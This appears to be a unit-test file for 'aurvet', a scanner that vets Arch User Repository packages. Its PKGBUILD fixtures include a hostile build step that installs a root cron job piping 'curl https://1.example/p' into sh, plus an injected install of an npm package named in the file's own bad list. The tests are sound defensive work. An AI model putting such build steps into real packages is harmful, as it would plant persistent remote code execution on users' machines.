"""End-to-end vetting with a fully stubbed AUR (no network)."""

import tempfile
import unittest
from unittest import mock

from aurvet import deps as depsmod
from aurvet import state as S
from aurvet import verify
from aurvet.lists import BadLists, Campaign
from aurvet.report import Verdict
from aurvet.rules import Severity

BENIGN = """# Maintainer: Good Person <g@x.y>
pkgname=goodpkg
pkgver=1.0
pkgrel=1
pkgdesc="A good package"
arch=(x86_64)
url="https://example.com/goodpkg"
license=(MIT)
depends=('curl')
source=("https://github.com/x/goodpkg/archive/refs/tags/v1.0.tar.gz")
sha256sums=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef')

build() {
  ./configure
  make
}

package() {
  make install DESTDIR=$pkgdir
}
"""

INJECTED = BENIGN.replace("  ./configure", "  npm install atomic-lockfile\n  ./configure")

OLD_BENIGN = """# Maintainer: Good Person <g@x.y>
pkgname=watched
pkgver=1.0
pkgrel=1
source=("https://github.com/x/watched/archive/refs/tags/v1.0.tar.gz")
sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
"""

NEW_EVIL = """# Maintainer: Good Person <g@x.y>
pkgname=watched
pkgver=1.0
pkgrel=1
source=("https://github.com/x/watched/archive/refs/tags/v1.0.tar.gz")
sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')

build() {
  crontab -l 2>/dev/null | cat - <<'EOF' >> /etc/cron.d/x
* * * * * root curl https://1.example/p | sh
EOF
}
"""


class FakeAUR:
    infos = {}
    snaps = {}
    commits_map = {}
    files_at = {}

    @classmethod
    def info(cls, names):
        return {n: v for n, v in cls.infos.items() if n in names}

    @classmethod
    def search(cls, keyword):
        return [v for v in cls.infos.values() if v["Name"] == keyword]

    @classmethod
    def snapshot(cls, name):
        if name not in cls.snaps:
            from aurvet.http import HttpError
            raise HttpError(f"404 for {name}")
        return cls.snaps[name]

    @classmethod
    def commits(cls, pkg, since_iso=None, per_page=50):
        from aurvet.aur import Commit
        items = cls.commits_map.get(pkg, [])
        if since_iso:
            items = [c for c in items if c.date[:10] > since_iso[:10]]
        return items[:per_page]

    @classmethod
    def file_at(cls, pkg, sha, path):
        key = (pkg, sha, path)
        if key in cls.files_at:
            return cls.files_at[key]
        from aurvet.http import HttpError
        raise HttpError(f" 404 for {key}")


def make_env(bad_pkgs=frozenset(), state=None):
    camp = Campaign(id="c", display="Test Campaign",
                    packages=set(bad_pkgs), npm_packages={"atomic-lockfile"})
    return verify.Env(
        bad=BadLists(campaigns=[camp], degraded=False),
        official={"curl"},
        official_src="stub",
        state=state if state is not None else {"version": 1, "packages": {}},
    )


class EnvTests(unittest.TestCase):
    def setUp(self):
        self._m1 = mock.patch.object(verify, "AUR", FakeAUR)
        self._m2 = mock.patch.object(depsmod, "AUR", FakeAUR)
        self._m1.start()
        self._m2.start()
        self.addCleanup(mock.patch.stopall)
        # reset shared fixture state
        FakeAUR.infos = {}
        FakeAUR.snaps = {}
        FakeAUR.commits_map = {}
        FakeAUR.files_at = {}

    def add_pkg(self, name, info, pkgbuild_text):
        FakeAUR.infos[name] = info
        FakeAUR.snaps[name] = {
            "PKGBUILD": pkgbuild_text.encode(),
            ".SRCINFO": b"pkgbase = %s\n" % name.encode(),
        }

    def test_clean_package(self):
        info = {"Name": "goodpkg", "Maintainer": "g", "Version": "1.0-1",
                "NumVotes": 10, "OutOfDate": None,
                "Depends": ["curl"], "MakeDepends": []}
        self.add_pkg("goodpkg", info, BENIGN)
        env = make_env()
        reports = verify.vet_many(["goodpkg"], verify.Opts(), env)
        self.assertEqual(reports[0].verdict, Verdict.CLEAN)
        self.assertEqual(
            [x.severity for x in reports[0].findings]
            .count(Severity.WARN), 0)
        self.assertEqual(
            [x.severity for x in reports[0].findings].count(Severity.BLOCK), 0)

    def test_known_bad_list_rejects(self):
        info = {"Name": "goodpkg", "Maintainer": "g", "Version": "1.0-1",
                "NumVotes": 10, "OutOfDate": None,
                "Depends": ["curl"], "MakeDepends": []}
        self.add_pkg("goodpkg", info, BENIGN)
        env = make_env(bad_pkgs={"goodpkg"})
        reports = verify.vet_many(["goodpkg"], verify.Opts(), env)
        self.assertEqual(reports[0].verdict, Verdict.REJECT)
        self.assertIn("known-badlist",
                      {f.rule for f in reports[0].findings})

    def test_injected_npm_wave_rejects(self):
        info = {"Name": "goodpkg", "Maintainer": "g", "Version": "1.0-1",
                "NumVotes": 10, "OutOfDate": None,
                "Depends": ["curl"], "MakeDepends": []}
        self.add_pkg("goodpkg", info, INJECTED)
        env = make_env()
        reports = verify.vet_many(["goodpkg"], verify.Opts(), env)
        self.assertEqual(reports[0].verdict, Verdict.REJECT)
        self.assertIn("known-bad-npm", {f.rule for f in reports[0].findings})

    def test_unknown_js_install_reviews(self):
        text = BENIGN.replace("  ./configure", "  npm install -g totally-fine-tool")
        info = {"Name": "goodpkg", "Maintainer": "g", "Version": "1.0-1",
                "NumVotes": 10, "OutOfDate": None,
                "Depends": ["curl"], "MakeDepends": []}
        self.add_pkg("goodpkg", info, text)
        env = make_env()
        reports = verify.vet_many(["goodpkg"], verify.Opts(), env)
        self.assertEqual(reports[0].verdict, Verdict.REVIEW)
        self.assertIn("js-build-dep", {f.rule for f in reports[0].findings})

    def test_malicious_dependency_escalates_parent(self):
        top = {
            "Name": "top", "Maintainer": "g", "Version": "1-1", "NumVotes": 1,
            "OutOfDate": None, "Depends": ["curl", "evildep"], "MakeDepends": [],
        }
        evil = {
            "Name": "evildep", "Maintainer": "m", "Version": "1-1", "NumVotes": 0,
            "OutOfDate": None, "Depends": [], "MakeDepends": [],
        }
        self.add_pkg("top", top, 'pkgname=top\nsource=(x)\n')
        self.add_pkg("evildep", evil, 'pkgname=evildep\n')
        env = make_env(bad_pkgs={"evildep"})
        reports = verify.vet_many(["top"], verify.Opts(), env)
        report = reports[0]
        self.assertEqual(report.verdict, Verdict.REJECT)
        self.assertIn("bad-dependency", {f.rule for f in report.findings})
        self.assertIn("evildep", [d["name"] for d in report.deps])

    def test_cleared_state_diff_and_new_committer(self):
        from aurvet.aur import Commit

        info = {"Name": "watched", "Maintainer": "g", "Version": "1.0-1",
                "NumVotes": 3, "OutOfDate": None,
                "Depends": [], "MakeDepends": []}
        self.add_pkg("watched", info, NEW_EVIL)
        FakeAUR.commits_map["watched"] = [
            Commit("new" * 4, "Mallory", "2026-10-05T00:00:00Z", "upgpkg"),
            Commit("old" * 4, "Goodie", "2026-01-01T00:00:00Z", "initial"),
        ]
        FakeAUR.files_at[("watched", "old" * 4, "PKGBUILD")] = OLD_BENIGN.encode()

        state = S.load(__import__("tempfile").mktemp(suffix=".json"))
        S.mark_cleared(state, "watched", "old" * 4,
                       {"PKGBUILD": OLD_BENIGN.encode(),
                        ".SRCINFO": b"pkgbase = watched\n"}, "clean",
                       extra={"committers": ["Goodie"]})
        # give the cleared entry a date in the past
        state["packages"]["watched"]["cleared_at"] = "2026-01-02T00:00:00Z"
        env = make_env(state=state)

        reports = verify.vet_many(["watched"], verify.Opts(), env)
        r = reports[0]
        self.assertEqual(r.changed_files, ["PKGBUILD"])
        self.assertTrue(r.file_diffs.get("PKGBUILD"))
        self.assertIn("+", r.file_diffs["PKGBUILD"])
        self.assertEqual(len(r.new_commits), 1)
        self.assertIn("new-committer", {f.rule for f in r.findings})
        # the injected crontab+pipe-to-shell is a BLOCK
        self.assertEqual(r.verdict, Verdict.REJECT)

    def test_clear_records_state(self):
        info = {"Name": "goodpkg", "Maintainer": "g", "Version": "1.0-1",
                "NumVotes": 10, "OutOfDate": None,
                "Depends": ["curl"], "MakeDepends": []}
        self.add_pkg("goodpkg", info, BENIGN)
        FakeAUR.commits_map["goodpkg"] = []
        state = {"version": 1, "packages": {}}
        env = make_env(state=state)
        reports = verify.vet_many(["goodpkg"], verify.Opts(clear=True), env)
        self.assertIn("goodpkg", state["packages"])
        self.assertEqual(
            set(state["packages"]["goodpkg"]["files"]),
            {"PKGBUILD", ".SRCINFO"})
        self.assertEqual(reports[0].verdict, Verdict.CLEAN)

    def test_missing_package_report(self):
        env = make_env()
        reports = verify.vet_many(["nosuchpkg"], verify.Opts(), env)
        self.assertEqual(reports[0].verdict, Verdict.ERROR)

    def test_snapshot_failure_with_badlist_hit_still_rejects(self):
        from aurvet.http import HttpError

        info = {"Name": "listpkg", "Maintainer": "g", "Version": "1-1",
                "NumVotes": 0, "OutOfDate": None,
                "Depends": [], "MakeDepends": []}
        FakeAUR.infos["listpkg"] = info
        # no snapshot registered -> AUR.snapshot raises HttpError
        env = make_env(bad_pkgs={"listpkg"})
        reports = verify.vet_many(["listpkg"], verify.Opts(), env)
        r = reports[0]
        self.assertEqual(r.verdict, Verdict.REJECT)
        self.assertIn("known-badlist", {f.rule for f in r.findings})


if __name__ == "__main__":
    unittest.main()
